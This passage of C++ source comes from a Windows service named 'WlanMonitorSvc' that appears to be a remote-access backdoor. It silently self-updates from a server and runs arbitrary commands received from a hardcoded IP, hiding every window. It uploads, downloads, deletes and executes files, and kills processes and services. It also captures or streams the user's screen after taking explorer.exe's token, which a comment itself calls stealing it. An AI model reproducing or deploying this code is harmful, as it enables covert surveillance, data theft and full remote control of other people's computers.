    std::string versionUrl = UPDATE_URL_BASE + "version.txt?t=" + timestamp;
    std::string exeUrl = UPDATE_URL_BASE + "WlanMonitorSvc.exe?t=" + timestamp;
    std::string tempVersionFile = GetExePath() + ".ver";

    WriteLog("【更新】开始连接服务器检查自动更新...");

    // 1. 清除系统自带的IE网络缓存，否则会一直读取到旧的缓存内容
    DeleteUrlCacheEntryA(versionUrl.c_str());
    DeleteUrlCacheEntryA(exeUrl.c_str());

    // 尝试下载 version.txt
    HRESULT hr = URLDownloadToFileA(NULL, versionUrl.c_str(), tempVersionFile.c_str(), 0, NULL);
    if (hr == S_OK) {
        std::ifstream verFile(tempVersionFile);
        std::string latestVersion;
        if (verFile >> latestVersion) {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());

            WriteLog("【更新】成功获取服务器最新版本: [" + latestVersion + "]，当前本地版本: [" + CURRENT_VERSION + "]");

            // 比较版本号（要求服务器端字符串不为空且不等于当前版本）
            if (!latestVersion.empty() && latestVersion != CURRENT_VERSION) {
                // 防止服务端版本号填错（仅修改version.txt未替换exe）导致死循环下载旧文件的防护
                std::string lockFile = GetExePath() + ".up_lock";
                std::ifstream lf(lockFile);
                std::string lastTriedVersion;
                if (lf >> lastTriedVersion) {
                    if (lastTriedVersion == latestVersion) {
                        WriteLog("【更新防护】发现新版本，但之前已尝试过更新且主程序未能成功变更为该版本。这通常是因为服务端的程序文件未及时上传覆盖，已中止本次更新循环！");
                        lf.close();
                        return;
                    }
                }
                lf.close();

                WriteLog("【更新】发现新版本: [" + latestVersion + "] (当前版本: [" + CURRENT_VERSION + "])，正在后台静默下载...");

                std::string newExePath = GetExePath() + ".new";
                hr = URLDownloadToFileA(NULL, exeUrl.c_str(), newExePath.c_str(), 0, NULL);
                if (hr == S_OK) {
                    WriteLog("【更新】新版本下载完成，正在应用更新并重启...");

                    // 写入本次尝试更新的版本号防死循环
                    std::ofstream outLf(lockFile, std::ios::trunc);
                    outLf << latestVersion;
                    outLf.close();

                    std::string currentExePath = GetExePath();

                    if (g_hMutex) {
                        CloseHandle(g_hMutex);
                        g_hMutex = NULL;
                    }

                    // Windows 中允许重命名正在执行的 .exe 文件
                    MoveFileA(currentExePath.c_str(), (currentExePath + ".old").c_str());
                    MoveFileA(newExePath.c_str(), currentExePath.c_str());

                    // 重启系统服务加载新版本
                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
                    sei.lpVerb = "open"; 
                    sei.lpFile = "cmd.exe"; 
                    sei.lpParameters = "/c ping 127.0.0.1 -n 2 > nul & net start WlanMonitorSvc"; 
                    sei.nShow = SW_HIDE;                
                    ShellExecuteExA(&sei);

                    // 立即自尽结束当前服务实例，触发操作系统的 Failure Action 以及 CMD 的接管拉起新实例
                    exit(1);
                } else {
                    WriteLog("【更新】版本文件新二进制文件获取失败，HRESULT: " + std::to_string(hr));
                }
            } else {
                WriteLog("【更新】检测完毕，未发现新版本，当前处于最新。");
            }
        } else {
            verFile.close();
            DeleteFileA(tempVersionFile.c_str());
            WriteLog("【更新】读取版本文件发现内容为空。");
        }
    } else {
        WriteLog("【更新】无法连接到服务器获取版本信息(version.txt)，HRESULT: " + std::to_string(hr));
    }
}

// 获取网卡MAC地址（通常用来唯一标识一台电脑）
std::string GetMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
    if (dwStatus != ERROR_SUCCESS) return "UNKNOWN_MAC";

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    char macAddr[18];
    sprintf_s(macAddr, "%02X-%02X-%02X-%02X-%02X-%02X",
        pAdapterInfo->Address[0], pAdapterInfo->Address[1],
        pAdapterInfo->Address[2], pAdapterInfo->Address[3],
        pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

    return std::string(macAddr);
}

// URL 编码辅助函数
std::string UrlEncode(const std::string& str) {
    std::string encoded = "";
    char buf[4];
    for (unsigned char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += '+';
        } else {
            sprintf_s(buf, "%%%02X", c);
            encoded += buf;
        }
    }
    return encoded;
}

// 执行CMD命令并获取输出结果
std::string ExecCmd(const std::string& cmd, bool outputIsUtf8) {
    if (GetTickCount64() - g_ServiceStartTime < 120000) {
        std::string lowerCmd = cmd;
        for (char& c : lowerCmd) c = tolower(c);
        if ((lowerCmd.find("shutdown") != std::string::npos || lowerCmd.find("poweroff") != std::string::npos) && lowerCmd.find("taskkill") == std::string::npos) {
            WriteLog("【安全保护】成功拦截开机初期的远程 shutdown 终端命令下发！");
            return "【防护机制已触发】：指令含关机操作，已被开机前 2 分钟安全期拦截。";
        }
    }

    std::string result = "";
    std::string full_cmd = "cmd.exe /c " + cmd + " 2>&1";
    std::string mutable_cmd = full_cmd; // CreateProcess需要可变的字符串指针

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "CreatePipe failed!";
    }
    // 确保读取端不被子进程继承，否则读管道可能会堵塞
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // 强制隐藏窗口

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    // 使用 CREATE_NO_WINDOW 彻底不创建控制台窗口
    if (!CreateProcessA(NULL, &mutable_cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "CreateProcess failed!";
    }

    CloseHandle(hWrite); // 必须在读取前先关闭自身的写入端，否则会导致死锁

    DWORD dwRead;
    CHAR chBuf[512];
    while (ReadFile(hRead, chBuf, sizeof(chBuf) - 1, &dwRead, NULL) && dwRead > 0) {
        chBuf[dwRead] = '\0';
        result += chBuf;
    }

    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (outputIsUtf8) {
        while(!result.empty() && result.back() == '\0') result.pop_back();
        return result;
    }

    // CMD默认输出是GBK编码，转为UTF-8防止网页端中文乱码
    int wLen = MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, NULL, 0);
    if (wLen > 0) {
        std::wstring wStr(wLen, 0);
        MultiByteToWideChar(CP_ACP, 0, result.c_str(), -1, &wStr[0], wLen);
        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
        if (utf8Len > 0) {
            std::string utf8Str(utf8Len, 0);
            WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
            while(!utf8Str.empty() && utf8Str.back() == '\0') utf8Str.pop_back();
            return utf8Str;
        }
    }
    return result;
}

// 向服务端提交执行结束的终端输出结果
void SendOutputToServer(const std::string& mac, const std::string& output) {
    std::string postData = "mac=" + UrlEncode(mac) + "&output=" + UrlEncode(output);
    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/cmd_result", NULL, NULL, NULL, 0, 1);
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                if (!HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length())) {
                    WriteLog("终端输出结果发送失败(HttpSendRequestA)，错误码: " + std::to_string(GetLastError()));
                }
                InternetCloseHandle(hRequest);
            } else {
                WriteLog("终端输出结果发送失败(HttpOpenRequestA)，错误码: " + std::to_string(GetLastError()));
            }
            InternetCloseHandle(hConnect);
        } else {
            WriteLog("终端输出结果发送失败(InternetConnectA)，错误码: " + std::to_string(GetLastError()));
        }
        InternetCloseHandle(hSession);
    } else {
        WriteLog("终端输出结果发送失败(InternetOpenA)，错误码: " + std::to_string(GetLastError()));
    }
}

// 存放服务器返回的此台电脑备注名，并在后续用于关机判断
std::string g_CustomMyName = "";

void ReportScreenLog(const std::string& log) {
    if (GetMacAddress() == "UNKNOWN_MAC") return;
    std::string utf8Log = AnsiToUtf8(log);
    std::string postData = "mac=" + UrlEncode(GetMacAddress()) + "&log=" + UrlEncode(utf8Log);
    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hSession) {
        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/screen/log", NULL, NULL, NULL, 0, 1);
            if (hRequest) {
                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hSession);
    }
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void CaptureScreenJpg(const std::string& filename) {
    // 强制声明进程的 DPI 感知，才能从 GetSystemMetrics 获取到未经系统缩放的最真实物理屏幕分辨率
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32) {
        typedef BOOL(WINAPI* PSETPROCESSDPIAWARE)(VOID);
        PSETPROCESSDPIAWARE pSetProcessDPIAware = (PSETPROCESSDPIAWARE)GetProcAddress(hUser32, "SetProcessDPIAware");
        if (pSetProcessDPIAware) pSetProcessDPIAware();
        FreeLibrary(hUser32);
    }

    ReportScreenLog("开始初始化GDI+");
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::Status st = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (st != Gdiplus::Ok) {
        ReportScreenLog("GDI+ 初始化失败，状态码: " + std::to_string(st));
        return;
    }

    // 支持多屏幕的虚拟桌面全集范围
    int nScreenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int nScreenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int nScreenY = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ReportScreenLog("获取到全虚拟屏幕分辨率: " + std::to_string(nScreenWidth) + "x" + std::to_string(nScreenHeight) + " (坐标原点: " + std::to_string(nScreenX) + "," + std::to_string(nScreenY) + ")");

    if (nScreenWidth <= 0 || nScreenHeight <= 0) {
        ReportScreenLog("虚拟频幕分辨率为 0，尝试回退获取主屏幕...");
        nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
        nScreenHeight = GetSystemMetrics(SM_CYSCREEN);
        nScreenX = 0;
        nScreenY = 0;
        if (nScreenWidth <= 0 || nScreenHeight <= 0) {
            ReportScreenLog("分辨率仍为 0，可能没有连接显示器或位于不支持桌面的安全会话中！");
            Gdiplus::GdiplusShutdown(gdiplusToken);
            return;
        }
    }

    HDC hDesktopDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
    if (!hDesktopDC) hDesktopDC = GetDC(NULL);
    if (!hDesktopDC) ReportScreenLog("致命：屏幕 DC 获取失败，错误码：" + std::to_string(GetLastError()));

    HDC hMemoryDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    // 填充黑色背景
    RECT bgRect = {0, 0, nScreenWidth, nScreenHeight};
    FillRect(hMemoryDC, &bgRect, (HBRUSH)GetStockObject(BLACK_BRUSH));

    // ==== 优先级 1：尝试使用 DXGI 捕获完美画面（无视全屏视频硬件遮挡） ====
    bool dxgiSuccess = false;
    DxgiScreenCapturer dxgi;
    HBITMAP hDxgiBmp = NULL;
    int dxW = 0, dxH = 0;
    if (dxgi.CaptureImage(hDxgiBmp, dxW, dxH, 200) && hDxgiBmp) {
        HDC hDxgiDC = CreateCompatibleDC(hDesktopDC);
        SelectObject(hDxgiDC, hDxgiBmp);
        SetStretchBltMode(hMemoryDC, COLORONCOLOR);
        StretchBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDxgiDC, 0, 0, dxW, dxH, SRCCOPY);
        DeleteDC(hDxgiDC);
        DeleteObject(hDxgiBmp);
        dxgiSuccess = true;
        ReportScreenLog("已通过 DXGI Desktop Duplication 成功抓取！");
    }

    if (!dxgiSuccess) {
        ReportScreenLog("DXGI 抓取超时或失败，退回到传统 GDI 模式...");
        // 复制坐标应当以虚拟桌面的坐标原点开始
        BOOL bltRes = BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, nScreenX, nScreenY, SRCCOPY | CAPTUREBLT);
        if (!bltRes) {
             ReportScreenLog("致命：BitBlt 画面复制失败，错误码：" + std::to_string(GetLastError()));
        } else {
             ReportScreenLog("BitBlt 抓取像素到内存完成");
        }

        // 【新增补丁】覆盖捕获硬件加速窗口
        HWND hForeground = GetForegroundWindow();
    if (hForeground && hForeground != GetDesktopWindow()) {
        char className[256];
        GetClassNameA(hForeground, className, sizeof(className));
        if (strcmp(className, "Progman") != 0 && strcmp(className, "WorkerW") != 0) {
            RECT fRect;
            if (GetWindowRect(hForeground, &fRect)) {
                int fW = fRect.right - fRect.left;
                int fH = fRect.bottom - fRect.top;
                if (fW > 0 && fH > 0 && (fW >= nScreenWidth / 2 || fH >= nScreenHeight / 2)) {
                    HDC hFgMemDC = CreateCompatibleDC(hDesktopDC);
                    HBITMAP hFgBitmap = CreateCompatibleBitmap(hDesktopDC, fW, fH);
                    HBITMAP hOldFgBmp = (HBITMAP)SelectObject(hFgMemDC, hFgBitmap);
                    if (PrintWindow(hForeground, hFgMemDC, 2)) {
                        BitBlt(hMemoryDC, fRect.left - nScreenX, fRect.top - nScreenY, fW, fH, hFgMemDC, 0, 0, SRCCOPY);
                        ReportScreenLog("已通过 PW_RENDERFULLCONTENT 补充抓取全屏/硬件加速窗口内容");
                    }
                    SelectObject(hFgMemDC, hOldFgBmp); DeleteObject(hFgBitmap); DeleteDC(hFgMemDC);
                }
            }
        }
    }
    } // 结束 if (!dxgiSuccess) 的判定分支

    {
        Gdiplus::Bitmap bitmap(hBitmap, NULL);
        CLSID clsid;
        if (GetEncoderClsid(L"image/jpeg", &clsid) != -1) {
            int wLen = MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, NULL, 0);
            if (wLen > 0) {
                std::wstring wFilename(wLen, 0);
                MultiByteToWideChar(CP_ACP, 0, filename.c_str(), -1, &wFilename[0], wLen);
                if (!wFilename.empty() && wFilename.back() == L'\0') wFilename.pop_back();
                Gdiplus::Status saveSt = bitmap.Save(wFilename.c_str(), &clsid, NULL);
                if (saveSt != Gdiplus::Ok) {
                    ReportScreenLog("保存到本地JPG失败，状态码：" + std::to_string(saveSt));
                } else {
                    ReportScreenLog("已保存图片到本地临时目录: " + filename);
                }
            }
        } else {
            ReportScreenLog("致命：找不到 image/jpeg 编码器");
        }
    } // 让 bitmap 对象在 GdiplusShutdown 之前析构销毁，否则会导致进程崩溃

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    if (hDesktopDC) {
        if (!ReleaseDC(NULL, hDesktopDC)) DeleteDC(hDesktopDC);
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
}

bool RunInUserSession(const std::string& cmdLine) {
    ReportScreenLog("接收到服务端指令请求，正在尝试穿透进入活动用户会话的桌面...");
    HANDLE hToken = NULL;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                            ReportScreenLog("成功窃取到 explorer.exe 进程的合法用户桌面Token");
                            CloseHandle(hProc);
                            break;
                        }
                        CloseHandle(hProc);
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (!hToken) {
        ReportScreenLog("未能找到 explorer.exe，退回到尝试使用 WTSActiveConsoleSession 获取默认控制台Token...");
        DWORD sessionId = WTSGetActiveConsoleSessionId();
        if (!WTSQueryUserToken(sessionId, &hToken)) {
            ReportScreenLog("WTSQueryUserToken 失败，这可能由于当前电脑处理锁屏状态或无人登录，错误码: " + std::to_string(GetLastError()));
            return false;
        }
    }

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken)) {
        ReportScreenLog("复制 TokenPrimary 失败，错误码: " + std::to_string(GetLastError()));
        CloseHandle(hToken);
        return false;
    }

    LPVOID pEnv = NULL;
    CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = (LPSTR)"winsta0\\default";

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    std::string wcmd = cmdLine;
    ReportScreenLog("拉取携带 \"-usermode SCREEN ...\" 参数的用户进程，指令: " + wcmd);
    BOOL bRes = CreateProcessAsUserA(
        hDupToken, 
        NULL, 
        &wcmd[0], 
        NULL, NULL, FALSE, 
        CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, 
        pEnv, 
        NULL, 
        &si, &pi);

    if (bRes) {
        ReportScreenLog("成功创建提权用户级子进程执行截屏任务。");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        ReportScreenLog("CreateProcessAsUserA 调用失败，错误码：" + std::to_string(GetLastError()));
    }

    DestroyEnvironmentBlock(pEnv);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    return bRes == TRUE;
}

// 字符串去除首尾空白和换行符（容错处理）
void TrimString(std::string &s) {
    if (s.empty()) return;
    s.erase(0, s.find_first_not_of(" \t\r\n"));
    s.erase(s.find_last_not_of(" \t\r\n") + 1);
}

// 向服务器报备上线
void ReportToServer() {
    std::string mac = GetMacAddress();
    std::string reportUrl = REPORT_URL_BASE + "?mac=" + mac + "&ver=" + CURRENT_VERSION + "&t=" + std::to_string(GetTickCount64());

    IStream* stream = NULL;
    HRESULT hr = URLOpenBlockingStreamA(0, reportUrl.c_str(), &stream, 0, 0);
    if (hr == S_OK && stream != NULL) {
        char buffer[1024];
        ULONG bytesRead;
        std::string response = "";
        while (SUCCEEDED(stream->Read(buffer, sizeof(buffer) - 1, &bytesRead)) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
        stream->Release();

        TrimString(response); // 消除可能的隐藏换行符，避免指令匹不上

        // 检测心跳回调是否携带了需要执行的操作命令
        if (!response.empty() && response != "Missing parameters") {
            if (response.find("SSID:") != std::string::npos) {
                // 如果包含 SSID:XXX，则更新存入本地内存的自定义名字
                size_t pos = response.find("SSID:");
                g_CustomMyName = response.substr(pos + 5);
                TrimString(g_CustomMyName); // 去除可能混入的换行或空白
            } else if (response.find("UPDATE_NOW") != std::string::npos) {
                WriteLog("收到服务端紧急下发的全局更新指令，立即启动更新程序！");
                CheckForUpdates();
            } else if (response.find("F_CMD:") == 0) {
                size_t pos1 = response.find(':', 6);
                if (pos1 != std::string::npos) {
                    std::string type = response.substr(6, pos1 - 6);
                    std::string argStrUtf8 = response.substr(pos1 + 1);
                    std::string argStr = Utf8ToAnsi(argStrUtf8); // 修复中文路径编码导致的 curl/CMD 执行失败 404 的问题
                    std::string res = "";

                    if (type == "LIST") {
                        res = GetFileListNative(argStr);
                    } else if (type == "DEL") {
                        std::string zPath = argStr;
                        zPath.append(2, '\0'); 
                        SHFILEOPSTRUCTA shfo = {0};
                        shfo.wFunc = FO_DELETE;
                        shfo.pFrom = zPath.c_str(); 
                        shfo.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI;
                        int shRes = SHFileOperationA(&shfo);
                        res = (shRes == 0) ? "Success" : "Fail: error code " + std::to_string(shRes);
                    } else if (type == "RN") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string oldP = argStr.substr(0, pipePos);
                            std::string newP = argStr.substr(pipePos + 1);
                            if (MoveFileA(oldP.c_str(), newP.c_str())) {
                                res = "Success";
                            } else {
                                res = "Fail: " + std::to_string(GetLastError());
                            }
                        }
                    } else if (type == "UP") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string url = argStr.substr(0, pipePos);
                            std::string path = argStr.substr(pipePos + 1);
                            std::string cmd = "curl.exe -k -F \"file=@" + path + "\" \"" + url + "\"";
                            res = ExecCmd(cmd);
                            if(res.empty()) res = "Success";
                        }
                    } else if (type == "DOWN") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string url = argStr.substr(0, pipePos);
                            std::string path = argStr.substr(pipePos + 1);
                            DeleteUrlCacheEntryA(url.c_str());
                            HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL);
                            res = (hr == S_OK) ? "Success" : ("Fail HTTP DL: " + std::to_string(hr));
                        }
                    } else if (type == "EXEC") {
                        // 解决 start 命令继承管道导致服务彻底假死的严重 BUG
                        std::string cmd = "cmd.exe /c start \"\" \"" + argStr + "\"";
                        PROCESS_INFORMATION pi; STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
                        if (CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                            res = "Success";
                        } else res = "Fail";
                    } else if (type == "UNINSTALL") {
                        // 剥离执行防止后台管道锁死，并强行提权穿透到当前用户的活动桌面，以防带界面的向导报错 Error 32 或静默不可见
                        std::string cmd = "cmd.exe /c start \"\" " + argStr;
                        HANDLE hToken = NULL;
                        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                        if (hSnap != INVALID_HANDLE_VALUE) {
                            PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
                            if (Process32FirstW(hSnap, &pe)) {
                                do {
                                    if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                                        if (hProc) {
                                            OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
                                            CloseHandle(hProc);
                                            if (hToken) break;
                                        }
                                    }
                                } while (Process32NextW(hSnap, &pe));
                            }
                            CloseHandle(hSnap);
                        }
                        if (!hToken) WTSQueryUserToken(WTSGetActiveConsoleSessionId(), &hToken);

                        BOOL success = FALSE;
                        if (hToken) {
                            HANDLE hDupToken = NULL;
                            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDupToken);
                            if (hDupToken) {
                                LPVOID pEnv = NULL;
                                CreateEnvironmentBlock(&pEnv, hDupToken, FALSE);
                                STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.lpDesktop = (LPSTR)"winsta0\\default";
                                PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
                                // 注意 FALSE 防止句柄继承产生阻塞，CREATE_NO_WINDOW 隐藏 cmd 黑窗，留下卸载本体窗口
                                if (CreateProcessAsUserA(hDupToken, NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, pEnv, NULL, &si, &pi)) {
                                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                                    success = TRUE;
                                }
                                DestroyEnvironmentBlock(pEnv);
                                CloseHandle(hDupToken);
                            }
                            CloseHandle(hToken);
                        }

                        if (success) {
                            res = AnsiToUtf8("Success: 卸载/修改命令已成功弹射到目标活动桌面。请在受控机完成界面向导操作。");
                        } else {
                            res = AnsiToUtf8("Fail: 无法穿透进入用户桌面会话执行程序。");
                        }
                    } else if (type == "MKDIR") {
                        std::string cmd = "cmd.exe /c mkdir \"" + argStr + "\"";
                        res = ExecCmd(cmd);
                        if(res.empty()) res = "Success";
                    } else if (type == "TASK_PROC") {
                        res = GetProcessListNative();
                    } else if (type == "TASK_PERF") {
                        res = GetPerfInfoNative();
                    } else if (type == "TASK_STARTUP") {
                        res = GetStartupListNative();
                    } else if (type == "TASK_SOFTWARE") {
                        res = GetSoftwareListNative();
                    } else if (type == "TASK_SVC") {
                        res = GetServiceListNative();
                    } else if (type == "TASK_KILL") {
                        int pid = 0;
                        try { pid = std::stoi(argStr); } catch(...) {}
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                        if (hProc) {
                            TerminateProcess(hProc, 0); CloseHandle(hProc); res = "Success";
                        } else {
                            res = "Fail: " + std::to_string(GetLastError());
                        }
                    } else if (type == "TASK_SVC_CTRL") {
                        size_t pipePos = argStr.find('|');
                        if (pipePos != std::string::npos) {
                            std::string action = argStr.substr(0, pipePos);
                            std::string svcName = argStr.substr(pipePos + 1);
                            SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
                            if (hSCM) {
                                SC_HANDLE hSvc = OpenServiceA(hSCM, svcName.c_str(), SERVICE_ALL_ACCESS);
                                if (hSvc) {
                                    if (action == "start") {
                                        if (StartServiceA(hSvc, 0, NULL)) res = "Success";
                                        else res = "Fail: " + std::to_string(GetLastError());
                                    } else {
                                        SERVICE_STATUS status;
                                        if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status)) res = "Success";
                                        else res = "Fail: " + std::to_string(GetLastError());
                                    }
                                    CloseServiceHandle(hSvc);
                                } else res = "Fail: OpenService error " + std::to_string(GetLastError());
                                CloseServiceHandle(hSCM);
                            } else res = "Fail: OpenSCM error " + std::to_string(GetLastError());
                        }
                    } else if (type == "SCREEN") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode SCREEN \"" + argStr + "\"";
                        if (RunInUserSession(cmd)) {
                            res = "Success: Capture triggered via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    } else if (type == "STREAM") {
                        std::string exePath = GetExePath();
                        std::string cmd = "\"" + exePath + "\" -usermode STREAM \"" + argStr + "\"";
                        if (RunInUserSession(cmd)) {
                            res = "Success: Stream triggered via user session.";
                        } else {
                            res = "Fail: User session unavailable. Error: " + std::to_string(GetLastError());
                        }
                    }

                    std::string postData = "mac=" + UrlEncode(mac) + "&type=" + UrlEncode(type) + "&output=" + UrlEncode(res);
                    HINTERNET hSession = InternetOpenA("WlanMonitorSvc_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                    if (hSession) {
                        HINTERNET hConnect = InternetConnectA(hSession, "120.78.3.56", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
                        if (hConnect) {
                            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/file_result", NULL, NULL, NULL, 0, 1);
                            if (hRequest) {
                                std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
                                HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)postData.c_str(), (DWORD)postData.length());
                                InternetCloseHandle(hRequest);
                            }
                            InternetCloseHandle(hConnect);
                        }
                        InternetCloseHandle(hSession);
                    }

                    // 用户操作执行完毕，上报一次日志使云端可以即时查看最新状态
                    UploadLogToServer();
                }
            } else {
                WriteLog("收到远程强制执行命令: " + response);
                std::string output = ExecCmd(response);
                SendOutputToServer(mac, output);

                // 执行外部系统命令后立即上传最新记录日志供查阅
                UploadLogToServer();
            }
        }
